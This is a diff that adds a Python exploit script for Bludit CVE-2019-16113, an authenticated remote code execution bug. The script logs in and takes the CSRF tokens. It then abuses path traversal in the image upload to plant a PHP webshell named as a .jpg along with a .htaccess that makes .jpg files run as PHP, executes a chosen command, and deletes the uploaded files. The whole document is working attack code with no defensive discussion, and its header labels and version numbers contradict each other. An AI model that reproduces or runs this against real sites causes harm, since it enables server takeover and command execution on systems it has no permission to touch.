@@ -1,0 +1,114 @@
+# Exploit Title: Bludit 3.9.12 - Directory Traversal
+# Date: 2020-06-05
+# Exploit Author: Luis Vacacas
+# Vendor Homepage: https://www.bludit.com
+# Software Link: https://github.com/bludit/bludit
+# Version: >= 3.9.12
+# Tested on: Ubuntu 19.10
+# CVE : CVE-2019-16113
+
+#!/usr/bin/env python3
+#-*- coding: utf-8 -*-
+import requests
+import re
+import argparse
+import random
+import string
+import base64
+from requests.exceptions import Timeout
+
+
+class Color:
+    PURPLE = '\033[95m'
+    CYAN = '\033[96m'
+    DARKCYAN = '\033[36m'
+    BLUE = '\033[94m'
+    GREEN = '\033[92m'
+    YELLOW = '\033[93m'
+    RED = '\033[91m'
+    BOLD = '\033[1m'
+    UNDERLINE = '\033[4m'
+    END = '\033[0m'
+
+banner  = base64.b64decode("4pWU4pWXIOKUrCAg4pSsIOKUrOKUjOKUrOKUkOKUrOKUjOKUrOKUkCAg4pWU4pWQ4pWX4pWmIOKVpuKVlOKVl+KVlArilaDilanilZfilIIgIOKUgiDilIIg4pSC4pSC4pSCIOKUgiAgIOKVoOKVkOKVneKVkeKVkeKVkeKVkeKVkeKVkQrilZrilZDilZ3ilLTilIDilJjilJTilIDilJjilIDilLTilJjilLQg4pS0ICAg4pWpICDilZrilanilZ3ilZ3ilZrilZ0KCiBDVkUtMjAxOS0xNjExMyBDeWJlclZhY2EKCg==").decode()
+
+print(Color.RED + Color.BOLD + "\n\n" + banner + Color.END)
+
+def get_args():
+    parser = argparse.ArgumentParser(description='Bludit RCE Exploit v3.9.2 CVE-2019-16113  \nBy @CyberVaca')
+    parser.add_argument('-u', dest='url', type=str, required=True, help='Url Bludit')
+    parser.add_argument('-user', dest='user', type=str,required=True, help='Username')
+    parser.add_argument('-pass', dest='password', type=str, required=True, help='Password' )
+    parser.add_argument('-c', dest='command', type=str, required=True, help='Command to execute' )
+    return parser.parse_args()
+
+
+
+def randomString(stringLength=8):
+    letters = string.ascii_lowercase
+    return ''.join(random.choice(letters) for i in range(stringLength))
+
+
+def informa(msg):
+    print (Color.GREEN + "[" + Color.RED + "+" + Color.GREEN + "] " +  msg)
+
+def login(url,username,password):
+    session = requests.Session()
+    login_page = session.get(url + "/admin/")
+    csrf_token = re.search('input.+?name="tokenCSRF".+?value="(.+?)"', login_page.text).group(1)
+    informa("csrf_token: " + Color.END + csrf_token)
+    la_cookie = ((login_page.headers['Set-Cookie']).split(";")[0].split("=")[1])
+    paramsPost = {"save":"","password":password,"tokenCSRF":csrf_token,"username":username}
+    headers = {"Origin":url,"Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8","Upgrade-Insecure-Requests":"1","User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:76.0) Gecko/20100101 Firefox/76.0","Connection":"close","Referer": url + "/admin/","Accept-Language":"es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3","Accept-Encoding":"gzip, deflate","Content-Type":"application/x-www-form-urlencoded"}
+    cookies = {"BLUDIT-KEY":la_cookie}
+    response = session.post(url + "/admin/", data=paramsPost, headers=headers, cookies=cookies, allow_redirects = False)
+    informa("cookie: " + Color.END + la_cookie)
+    return(la_cookie)
+
+
+def csrf_logado(url,la_cookie):
+    session = requests.Session()
+    headers = {"Origin":url,"Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8","Upgrade-Insecure-Requests":"1","User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:76.0) Gecko/20100101 Firefox/76.0","Connection":"close","Referer":url + "/admin/","Accept-Language":"es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3","Accept-Encoding":"gzip, deflate"}
+    cookies = {"BLUDIT-KEY":la_cookie}
+    response = session.get(url + "/admin/dashboard", headers=headers, cookies=cookies)
+    token_logado = response.text.split('var tokenCSRF = "')[1].split('"')[0]
+    informa("csrf_token: " + Color.END + token_logado)
+    return token_logado
+
+def subida_shell(url,la_cookie,token_logado,command,webshell):
+    session = requests.Session()
+    paramsPost = {"uuid":"../../tmp","tokenCSRF":token_logado}
+    paramsMultipart = [('images[]', (webshell, "<?php shell_exec(\"rm .htaccess ; rm " + webshell + " ;" + command + "\");?>", 'application/octet-stream'))]
+    headers = {"Origin":url,"Accept":"*/*","X-Requested-With":"XMLHttpRequest","User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:76.0) Gecko/20100101 Firefox/76.0","Connection":"close","Referer":url + "/admin/new-content","Accept-Language":"es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3","Accept-Encoding":"gzip, deflate"}
+    cookies = {"BLUDIT-KEY":la_cookie}
+    response = session.post(url + "/admin/ajax/upload-images", data=paramsPost, files=paramsMultipart, headers=headers, cookies=cookies)
+    informa("Uploading " + Color.END + webshell + Color.END)
+
+def subida_htaccess(url,la_cookie,token_logado):
+    session = requests.Session()
+    paramsPost = {"uuid":"../../tmp","tokenCSRF":token_logado}
+    paramsMultipart = [('images[]', ('.htaccess', "RewriteEngine off\r\nAddType application/x-httpd-php .jpg", 'application/octet-stream'))]
+    headers = {"Origin":url,"Accept":"*/*","X-Requested-With":"XMLHttpRequest","User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:76.0) Gecko/20100101 Firefox/76.0","Connection":"close","Referer":url + "/admin/new-content","Accept-Language":"es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3","Accept-Encoding":"gzip, deflate"}
+    cookies = {"BLUDIT-KEY":la_cookie}
+    response = session.post(url + "/admin/ajax/upload-images", data=paramsPost, files=paramsMultipart, headers=headers, cookies=cookies)
+
+def trigger_command(url,webshell,command):
+    session = requests.Session()
+    headers = {"Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8","Upgrade-Insecure-Requests":"1","User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:76.0) Gecko/20100101 Firefox/76.0","Connection":"close","Accept-Language":"es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3","Accept-Encoding":"gzip, deflate"}
+    try:
+        response = session.get(url + "/bl-content/tmp/" + webshell, headers=headers, timeout=1)
+    except requests.exceptions.ReadTimeout:
+        pass
+    informa("Executing command: " + Color.END + command )
+    informa("Delete: " + Color.END + ".htaccess")
+    informa("Delete: " + Color.END +  webshell)
+
+
+if __name__ == '__main__':
+    args = get_args()
+    webshell = randomString(8) + ".jpg"
+    la_cookie = login(args.url,args.user,args.password)
+    token_logado = csrf_logado(args.url,la_cookie)
+    subida_shell(args.url,la_cookie,token_logado,args.command,webshell)
+    subida_htaccess(args.url,la_cookie,token_logado)
+    trigger_command(args.url,webshell,args.command)
